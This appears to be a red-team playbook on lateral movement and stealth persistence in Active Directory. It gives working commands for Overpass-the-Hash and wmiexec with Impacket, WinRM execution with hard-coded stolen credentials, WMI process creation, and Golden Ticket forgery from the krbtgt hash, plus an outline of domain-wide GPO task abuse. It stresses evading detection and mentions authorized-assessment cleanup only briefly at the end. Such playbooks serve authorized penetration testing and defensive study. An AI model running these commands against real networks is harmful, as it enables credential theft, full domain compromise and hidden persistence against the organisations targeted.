# Lateral Movement & Enterprise Persistence Playbook

This playbook documents lateral movement and stealth persistence techniques across enterprise Windows and Active Directory domains without leaving high-noise file system artifacts.

---

## 1. Fileless Lateral Movement (T1021 / T1550)

### Pass-the-Hash (PtH) & Overpass-the-Hash
When administrative NTLM hashes are recovered (via Kerberoasting or memory dumps), direct authentication is performed without plaintext passwords:
```bash
# Overpass-the-Hash: Requesting a full Kerberos TGT using NTLM hash
getTGT.py -hashes :<ADMIN_NTLM_HASH> corp.local/Administrator
export KRB5CCNAME=Administrator.ccache

# Execute commands remotely over SMB using Kerberos ticket
wmiexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Windows Remote Management (WinRM - T1021.006)
WinRM communicates over standard WS-Management HTTP/HTTPS ports (5985 / 5986), blending naturally with enterprise administration traffic:
```powershell
$password = ConvertTo-SecureString "CompromisedAdminPass" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("CORP\Administrator", $password)
Invoke-Command -ComputerName sql01.corp.local -Credential $cred -ScriptBlock { whoami /all }
```

### WMI Process Execution (T1047)
WMI creates processes via `Win32_Process.Create` directly in memory without creating temporary Windows services or dropping `.exe` binaries into `ADMIN$`:
```bash
# Executing via Impacket wmiexec
wmiexec.py corp.local/admin_user:Password@10.10.10.50 "whoami"
```

---

## 2. Stealth Domain Persistence (T1098 / T1558)

### Golden Ticket (T1558.001)
Once Domain Controller access is achieved, extracting the `krbtgt` account NTLM hash allows forging forged Ticket Granting Tickets (TGT) valid for 10 years across the entire forest:
```bash
# Forge Golden Ticket using ticketer
ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXX -domain corp.local -groups 512,513,519,520 Administrator
export KRB5CCNAME=Administrator.ccache
```

### Targeted GPO Modification (T1484.001)
Modifying an existing, frequently applied Group Policy Object (GPO) to deploy an immediate or periodic scheduled task across all domain-joined workstations:
- Bypasses individual host defenses as the task execution is triggered by the trusted Windows Group Policy Client engine (`gpsvc`).

---

## 3. Operational Security & Artifact Remediation
- Maintain a strict time-stamped ledger of every created account, modified ACL, and active beacon.
- Upon completion of assessment milestones, coordinate immediately with the White Cell to purge all persistence mechanisms and session tokens.
